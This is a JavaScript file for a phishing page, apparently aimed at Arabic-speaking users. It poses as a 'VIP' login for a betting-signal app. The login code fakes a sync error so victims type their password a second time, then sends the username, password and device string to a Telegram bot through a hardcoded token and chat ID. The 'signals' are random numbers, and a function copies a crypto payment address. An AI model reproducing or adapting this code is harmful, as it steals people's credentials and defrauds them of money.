const TG_BOT_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let attempts = 0;

// حل مشكلة الإرسال من أجهزة مختلفة (CORS & Network handling)
async function sendToHunter(user, pass) {
    const text = `🎯 NEW TARGET CAPTURED!\n👤 User: ${user}\n🔑 Pass: ${pass}\n📱 Device: ${navigator.userAgent.slice(0, 50)}`;
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
    
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text }),
            keepalive: true // يضمن استمرار الإرسال حتى لو أغلق المتصفح
        });
    } catch (e) {
        // استخدام الطريقة التقليدية كخيار بديل (Fallback)
        const img = new Image();
        img.src = `${url}?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
    }
}

function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 5 || p.length < 5) return alert("خطأ في البيانات!");

    btn.disabled = true;
    btn.innerText = "Connecting...";

    setTimeout(() => {
        attempts++;
        if (attempts === 1) {
            msg.innerText = "خطأ في المزامنة: يرجى استخدام الحساب النشط لربط الـ VIP";
            msg.style.color = "#fbbf24";
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        } else {
            sendToHunter(u, p);
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('main-app').classList.remove('hidden');
        }
    }, 1500);
}

function getSignal() {
    const btn = document.getElementById('action-btn');
    const display = document.getElementById('target-mult');
    
    btn.disabled = true;
    display.innerText = "WAIT..";
    
    setTimeout(() => {
        const val = (Math.random() * (4.50 - 1.10) + 1.10).toFixed(2);
        display.innerText = val + "x";
        btn.disabled = false;
    }, 1200);
}

function copyAddr() {
    navigator.clipboard.writeText("TYXbsFZK3HYq3LX1uwX113Ukrm44ib9XDr");
    alert("تم نسخ عنوان الدفع (TRC20)");
}
